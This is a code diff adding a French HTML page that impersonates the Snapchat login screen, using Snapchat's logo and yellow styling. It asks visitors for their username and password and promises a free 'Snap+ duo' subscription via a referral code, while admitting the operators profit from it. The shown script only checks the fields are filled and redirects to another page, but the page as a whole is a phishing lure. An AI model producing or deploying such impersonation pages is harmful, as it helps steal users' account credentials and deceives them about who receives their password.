@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Connexion Snapchat</title>
+  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/fr/7/75/Snapchat.png">
+  <style>
+    body {
+      background: #fffc00;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      margin: 0;
+      padding: 20px;
+    }
+
+    .snap-logo {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      text-align: center;
+      max-width: 400px;
+      width: 100%;
+    }
+
+    input {
+      display: block;
+      width: 100%;
+      margin: 10px 0;
+      padding: 10px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      background: black;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    h2 {
+      margin-bottom: 20px;
+    }
+
+    .info {
+      background: #fff;
+      margin-top: 20px;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.08);
+      max-width: 400px;
+      text-align: left;
+      font-size: 14px;
+    }
+
+    .info strong {
+      display: block;
+      margin-bottom: 10px;
+      font-size: 16px;
+    }
+
+    .info ul {
+      padding-left: 20px;
+      margin-top: 0;
+    }
+
+    .info p {
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+  <img class="snap-logo" src="https://upload.wikimedia.org/wikipedia/fr/7/75/Snapchat.png" alt="Snapchat Logo">
+ 
+  <div class="container">
+    <h2>Connexion à Snapchat</h2>
+    <input type="text" id="identifiant" placeholder="Nom d'utilisateur ou email/numéro">
+    <input type="password" id="motdepasse" placeholder="Mot de passe">
+    <button onclick="seConnecter()">Se connecter</button>
+  </div>
+
+  <div class="info">
+    <strong>Comment ça fonctionne ?</strong>
+    <ul>
+      <li>1. Connecte-toi à ton compte Snapchat</li>
+      <li>2. Entre le code de parrainage ou de connexion</li>
+      <li>3. Profite de Snap+ en duo gratuitement dans les 48h qui suivent</li>
+    </ul>
+    <p><strong>Pourquoi utiliser notre service ?</strong><br>
+    En passant par notre page, vous réduisez les empreintes carbone, vous économisez de l'argent, et nous permettez aussi de gagner un peu. Un bon plan pour tout le monde ! 🌍💸</p>
+  </div>
+
+  <script>
+    function seConnecter() {
+      const id = document.getElementById('identifiant').value.trim();
+      const mdp = document.getElementById('motdepasse').value.trim();
+      if (id !== "" && mdp !== "") {
+        window.location.href = "parrainage.html";
+      } else {
+        alert("Veuillez remplir tous les champs.");
+      }
+    }
+  </script>
+
+</body>
+</html>
